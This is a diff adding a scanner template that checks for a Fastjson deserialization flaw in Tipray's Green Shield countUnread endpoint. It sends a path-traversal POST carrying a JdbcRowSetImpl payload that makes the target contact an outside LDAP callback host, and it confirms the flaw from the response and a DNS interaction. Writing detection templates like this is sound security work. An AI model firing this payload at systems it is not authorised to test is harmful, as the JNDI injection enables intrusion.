@@ -1,0 +1,40 @@
+id: poc-yaml-tipray-gsas-countunread-fastjson-deserialization
+info:
+  name: Tianrui Green Shield countUnread Fastjson Deserialization
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: deserialization,dnslog
+http:
+  - raw:
+      - |
+        POST /trwfe/login.jsp/.%2e/rest/ext/countUnread HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+            "@type": "com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName": "ldap://{{interactsh-url}}",
+            "autoCommit": true
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: word
+        part: body
+        words:
+          - "set property error"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
